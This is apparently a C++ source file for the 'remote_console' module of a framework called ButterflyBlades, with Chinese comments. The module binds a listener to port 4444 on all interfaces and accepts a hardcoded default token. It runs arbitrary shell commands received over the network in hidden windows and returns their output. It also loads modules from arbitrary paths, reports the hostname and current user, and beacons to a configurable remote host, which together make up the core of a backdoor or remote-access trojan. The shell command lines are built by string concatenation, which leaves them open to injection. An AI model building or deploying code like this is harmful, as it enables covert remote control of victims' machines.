// ButterflyBlades 远程控制台模块
// 提供远程 Shell 访问、模块管理、指令分发

#include "core.h"
#include <nlohmann/json.hpp>
#ifdef _WIN32
#include <windows.h>
#endif
#include <iostream>
#include <fstream>
#include <thread>
#include <atomic>
#include <sstream>
#include <algorithm>

namespace bb {

class RemoteConsoleModule : public IModule {
private:
    std::atomic<bool> running_{false};
    std::atomic<bool> initialized_{false};
    std::unique_ptr<std::thread> listener_thread_;
    std::unique_ptr<std::thread> heartbeat_thread_;
    EventCallback event_callback_;

    // 配置
    uint16_t listen_port_ = 4444;
    std::string bind_addr_ = "0.0.0.0";
    std::string auth_token_ = "butterflyblades_default_token";
    bool auth_required_ = true;

    // 支持的 Shell 类型
    enum class ShellType { CMD, POWERSHELL, BASH, PYTHON, CUSTOM };
    std::string active_shell_ = "cmd";

    // 心跳配置
    uint32_t heartbeat_interval_sec_ = 30;
    std::string heartbeat_target_;
    uint16_t heartbeat_port_ = 0;

    // 命令计数器
    std::atomic<uint32_t> command_counter_{0};

    // 活跃客户端
    struct ClientSession {
        uint32_t session_id;
        std::chrono::steady_clock::time_point connected_at;
        std::string remote_addr;
    };
    std::vector<ClientSession> active_sessions_;
    std::mutex session_mutex_;

public:
    ModuleDescriptor get_descriptor() const override {
        ModuleDescriptor desc;
        desc.name = "remote_console";
        desc.version = "0.1.0";
        desc.description = "Remote shell console with multi-shell support and module management";
        desc.author = "ButterflyBlades Team";
        desc.enabled = false;
        desc.is_loaded = false;
        desc.priority = 50;  // 最后启动
        return desc;
    }

    std::string get_name() const override { return "remote_console"; }

    ErrorCode init() override {
        initialized_.store(true);
        return ErrorCode::SUCCESS;
    }

    ErrorCode start() override {
        if (!initialized_.load()) return ErrorCode::ERR_NOT_INITIALIZED;
        running_.store(true);

        // 启动TCP监听
        auto& svc = ServiceManager::instance();
        auto* netOps = svc.network_ops();

        ErrorCode ret = netOps->start_listener(listen_port_, bind_addr_);
        if (ret != ErrorCode::SUCCESS) {
            return ret;
        }

        listener_thread_ = std::make_unique<std::thread>([this]() {
            accept_loop();
        });

        // 心跳线程（如果配置了心跳目标）
        if (!heartbeat_target_.empty() && heartbeat_port_ > 0) {
            heartbeat_thread_ = std::make_unique<std::thread>([this]() {
                heartbeat_loop();
            });
        }

        std::cout << "[RemoteConsole] Listening on " << bind_addr_ << ":" << listen_port_ << std::endl;
        return ErrorCode::SUCCESS;
    }

    ErrorCode stop() override {
        running_.store(false);

        auto& svc = ServiceManager::instance();
        svc.network_ops()->stop_listener();

        if (listener_thread_ && listener_thread_->joinable()) {
            listener_thread_->join();
            listener_thread_.reset();
        }
        if (heartbeat_thread_ && heartbeat_thread_->joinable()) {
            heartbeat_thread_->join();
            heartbeat_thread_.reset();
        }
        return ErrorCode::SUCCESS;
    }

    ErrorCode shutdown() override {
        stop();
        initialized_.store(false);
        return ErrorCode::SUCCESS;
    }

    void set_event_callback(EventCallback callback) override {
        event_callback_ = std::move(callback);
    }

    bool is_running() const override { return running_.load(); }
    bool is_initialized() const override { return initialized_.load(); }

    ErrorCode load_config(const std::string& config_path) override {
        try {
            std::ifstream file(config_path);
            nlohmann::json j;
            file >> j;

            listen_port_ = j.value("listen_port", 4444);
            bind_addr_ = j.value("bind_addr", "0.0.0.0");
            auth_token_ = j.value("auth_token", "butterflyblades_default_token");
            auth_required_ = j.value("auth_required", true);
            active_shell_ = j.value("default_shell", "cmd");
            heartbeat_target_ = j.value("heartbeat_target", "");
            heartbeat_port_ = j.value("heartbeat_port", 0);
            heartbeat_interval_sec_ = j.value("heartbeat_interval_sec", 30);
        } catch (...) {
            return ErrorCode::ERR_UNKNOWN;
        }
        return ErrorCode::SUCCESS;
    }

    ErrorCode save_config(const std::string& config_path) override {
        nlohmann::json j;
        j["listen_port"] = listen_port_;
        j["bind_addr"] = bind_addr_;
        j["auth_token"] = auth_token_;
        j["auth_required"] = auth_required_;
        j["default_shell"] = active_shell_;
        j["heartbeat_target"] = heartbeat_target_;
        j["heartbeat_port"] = heartbeat_port_;
        j["heartbeat_interval_sec"] = heartbeat_interval_sec_;

        std::ofstream file(config_path);
        file << j.dump(4);
        return ErrorCode::SUCCESS;
    }

    ErrorCode handle_remote_command(const RemoteCommand& cmd, RemoteResponse& resp) override {
        resp.command_id = cmd.command_id;

        if (cmd.action == "set_config") {
            try {
                auto j = nlohmann::json::parse(cmd.payload);
                if (j.contains("listen_port")) listen_port_ = j["listen_port"];
                if (j.contains("auth_token")) auth_token_ = j["auth_token"];
                if (j.contains("auth_required")) auth_required_ = j["auth_required"];
                if (j.contains("default_shell")) active_shell_ = j["default_shell"];
                resp.code = ErrorCode::SUCCESS;
            } catch (...) {
                resp.code = ErrorCode::ERR_INVALID_PARAM;
            }
        }
        else if (cmd.action == "status") {
            nlohmann::json j;
            j["running"] = running_.load();
            j["port"] = listen_port_;
            j["active_sessions"] = active_sessions_.size();
            j["auth_required"] = auth_required_;
            j["default_shell"] = active_shell_;
            j["commands_processed"] = command_counter_.load();
            resp.data = j.dump();
            resp.code = ErrorCode::SUCCESS;
        }
        else if (cmd.action == "set_heartbeat") {
            try {
                auto j = nlohmann::json::parse(cmd.payload);
                heartbeat_target_ = j["target"];
                heartbeat_port_ = j["port"];
                heartbeat_interval_sec_ = j.value("interval_sec", 30);
                resp.code = ErrorCode::SUCCESS;
            } catch (...) {
                resp.code = ErrorCode::ERR_INVALID_PARAM;
            }
        }
        else {
            resp.code = ErrorCode::ERR_INVALID_PARAM;
        }
        return resp.code;
    }

private:
    // 协议格式：BB_PROTO_V1|<command_json>\n
    std::string build_protocol_message(const nlohmann::json& data) {
        return "BB_PROTO_V1|" + data.dump() + "\n";
    }

    nlohmann::json parse_protocol_message(const std::string& raw) {
        const std::string prefix = "BB_PROTO_V1|";
        if (raw.find(prefix) != 0) return {};
        std::string json_str = raw.substr(prefix.length());
        try {
            return nlohmann::json::parse(json_str);
        } catch (...) {
            return {};
        }
    }

    void accept_loop() {
        auto& svc = ServiceManager::instance();
        auto* netOps = svc.network_ops();

        while (running_.load()) {
            // TCP accept（简化实现，实际应在新线程中处理每个连接）
            std::vector<uint8_t> data;
            ErrorCode ret = netOps->tcp_recv(data, 1000);
            if (ret != ErrorCode::SUCCESS || data.empty()) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                continue;
            }

            std::string raw(data.begin(), data.end());
            auto msg = parse_protocol_message(raw);
            if (msg.empty()) continue;

            process_client_message(msg);
        }
    }

    void process_client_message(const nlohmann::json& msg) {
        std::string action = msg.value("action", "");

        // 认证
        if (auth_required_) {
            std::string token = msg.value("auth_token", "");
            if (token != auth_token_) {
                send_error("auth_failed", "Invalid authentication token");
                return;
            }
        }

        command_counter_++;

        if (action == "list_modules") {
            handle_list_modules();
        }
        else if (action == "load_module") {
            handle_load_module(msg);
        }
        else if (action == "unload_module") {
            handle_unload_module(msg);
        }
        else if (action == "start_module") {
            // 通过模块管理器启动指定模块
            auto& mgr = ModuleManager::instance();
            auto* mod = mgr.get_module(msg.value("module", ""));
            if (mod) {
                mod->start();
                send_response(action, "success");
            } else {
                send_error("module_not_found", msg.value("module", ""));
            }
        }
        else if (action == "stop_module") {
            auto& mgr = ModuleManager::instance();
            auto* mod = mgr.get_module(msg.value("module", ""));
            if (mod) {
                mod->stop();
                send_response(action, "success");
            } else {
                send_error("module_not_found", msg.value("module", ""));
            }
        }
        else if (action == "exec_command") {
            handle_exec_command(msg);
        }
        else if (action == "ping") {
            // 心跳响应
            nlohmann::json resp;
            resp["action"] = "pong";
            resp["timestamp"] = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::system_clock::now().time_since_epoch()).count();
            resp["hostname"] = ServiceManager::instance().system_ops()->get_hostname();
            resp["version"] = BB_VERSION_STR;
            send_raw(build_protocol_message(resp));
        }
        else if (action == "dispatch") {
            handle_dispatch(msg);
        }
        else if (action == "get_system_info") {
            handle_system_info();
        }
        else {
            send_error("unknown_action", action);
        }
    }

    void handle_list_modules() {
        auto modules = ModuleManager::instance().list_modules();
        nlohmann::json resp;
        resp["action"] = "list_modules";
        resp["modules"] = nlohmann::json::array();
        for (auto& m : modules) {
            nlohmann::json mod;
            mod["name"] = m.name;
            mod["version"] = m.version;
            mod["description"] = m.description;
            mod["enabled"] = m.enabled;
            mod["is_loaded"] = m.is_loaded;
            mod["priority"] = m.priority;
            resp["modules"].push_back(mod);
        }
        resp["total"] = modules.size();
        send_raw(build_protocol_message(resp));
    }

    void handle_load_module(const nlohmann::json& msg) {
        std::string path = msg.value("path", "");
        ErrorCode ret = ModuleManager::instance().load_module(path);
        if (ret == ErrorCode::SUCCESS) {
            send_response("load_module", "success");
        } else {
            send_error("load_failed", "Failed to load: " + path);
        }
    }

    void handle_unload_module(const nlohmann::json& msg) {
        std::string name = msg.value("module", "");
        ErrorCode ret = ModuleManager::instance().unload_module(name);
        if (ret == ErrorCode::SUCCESS) {
            send_response("unload_module", "success");
        } else {
            send_error("unload_failed", "Failed to unload: " + name);
        }
    }

    void handle_exec_command(const nlohmann::json& msg) {
        std::string command = msg.value("command", "");
        std::string shell = msg.value("shell", active_shell_);

        std::string result = execute_shell_command(command, shell);

        nlohmann::json resp;
        resp["action"] = "exec_result";
        resp["command"] = command;
        resp["shell"] = shell;
        resp["output"] = result;
        send_raw(build_protocol_message(resp));
    }

    void handle_dispatch(const nlohmann::json& msg) {
        RemoteCommand cmd;
        cmd.command_id = command_counter_.load();
        cmd.module = msg.value("module", "*");
        cmd.action = msg.value("cmd_action", "");
        cmd.payload = msg.value("payload", nlohmann::json()).dump();
        cmd.require_response = true;
        cmd.received_time = std::chrono::steady_clock::now();

        RemoteResponse resp = ModuleManager::instance().dispatch_command(cmd);

        nlohmann::json j;
        j["action"] = "dispatch_result";
        j["command_id"] = resp.command_id;
        j["code"] = (int)resp.code;
        j["data"] = resp.data;
        send_raw(build_protocol_message(j));
    }

    void handle_system_info() {
        auto& svc = ServiceManager::instance();
        auto* sysOps = svc.system_ops();

        nlohmann::json resp;
        resp["action"] = "system_info";
        resp["hostname"] = sysOps->get_hostname();
        resp["os"] = sysOps->get_os_name();
        resp["user"] = sysOps->get_current_user();
        resp["total_memory_mb"] = sysOps->get_total_memory();
        resp["available_memory_mb"] = sysOps->get_available_memory();
        resp["cpu_usage"] = sysOps->get_system_cpu_usage();
        resp["bb_version"] = BB_VERSION_STR;

        auto modules = ModuleManager::instance().list_modules();
        resp["loaded_modules"] = modules.size();

        send_raw(build_protocol_message(resp));
    }

    void send_response(const std::string& action, const std::string& message) {
        nlohmann::json resp;
        resp["action"] = action;
        resp["status"] = message;
        send_raw(build_protocol_message(resp));
    }

    void send_error(const std::string& error, const std::string& detail) {
        nlohmann::json resp;
        resp["action"] = "error";
        resp["error"] = error;
        resp["detail"] = detail;
        send_raw(build_protocol_message(resp));
    }

    void send_raw(const std::string& data) {
        auto* netOps = ServiceManager::instance().network_ops();
        std::vector<uint8_t> bytes(data.begin(), data.end());
        netOps->tcp_send(bytes);
    }

    std::string execute_shell_command(const std::string& command, const std::string& shell) {
        std::string full_cmd;
        shell_type_ = shell;

#ifdef _WIN32
        if (shell == "cmd" || shell == "batch") {
            full_cmd = "cmd.exe /c " + command;
        } else if (shell == "powershell" || shell == "ps") {
            full_cmd = "powershell.exe -NoProfile -Command " + command;
        } else if (shell == "python" || shell == "py") {
            full_cmd = "python -c \"" + command + "\"";
        } else {
            full_cmd = "cmd.exe /c " + command;
        }
#else
        if (shell == "bash" || shell == "sh") {
            full_cmd = "bash -c '" + command + "'";
        } else if (shell == "python" || shell == "py") {
            full_cmd = "python3 -c '" + command + "'";
        } else {
            full_cmd = "sh -c '" + command + "'";
        }
#endif

        // 执行命令并捕获输出
        std::string output;
#ifdef _WIN32
        HANDLE hPipeRead, hPipeWrite;
        SECURITY_ATTRIBUTES sa{ sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
        CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0);
        SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);

        STARTUPINFOA si{ sizeof(STARTUPINFOA) };
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hPipeWrite;
        si.hStdError = hPipeWrite;

        PROCESS_INFORMATION pi{};
        std::vector<char> cmd_buf(full_cmd.begin(), full_cmd.end());
        cmd_buf.push_back(0);

        if (CreateProcessA(nullptr, cmd_buf.data(), nullptr, nullptr, TRUE,
                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(hPipeWrite);
            WaitForSingleObject(pi.hProcess, 30000); // 30秒超时

            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
                buffer[bytesRead] = 0;
                output += buffer;
            }
            CloseHandle(hPipeRead);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
#endif
        return output;
    }

    void heartbeat_loop() {
        auto& svc = ServiceManager::instance();
        auto* netOps = svc.network_ops();

        while (running_.load()) {
            if (!heartbeat_target_.empty() && heartbeat_port_ > 0) {
                ErrorCode ret = netOps->tcp_connect(heartbeat_target_, heartbeat_port_);
                if (ret == ErrorCode::SUCCESS) {
                    nlohmann::json beat;
                    beat["action"] = "heartbeat";
                    beat["hostname"] = svc.system_ops()->get_hostname();
                    beat["timestamp"] = std::chrono::duration_cast<std::chrono::seconds>(
                        std::chrono::system_clock::now().time_since_epoch()).count();
                    beat["version"] = BB_VERSION_STR;

                    std::string msg = build_protocol_message(beat);
                    std::vector<uint8_t> bytes(msg.begin(), msg.end());
                    netOps->tcp_send(bytes);
                    netOps->tcp_disconnect();
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(heartbeat_interval_sec_));
        }
    }

    std::string shell_type_;
};

#ifndef BB_STATIC_MODULES
extern "C" IModule* create_module() {
    return new RemoteConsoleModule();
}

extern "C" void destroy_module(IModule* mod) {
    delete mod;
}
#endif

} // namespace bb
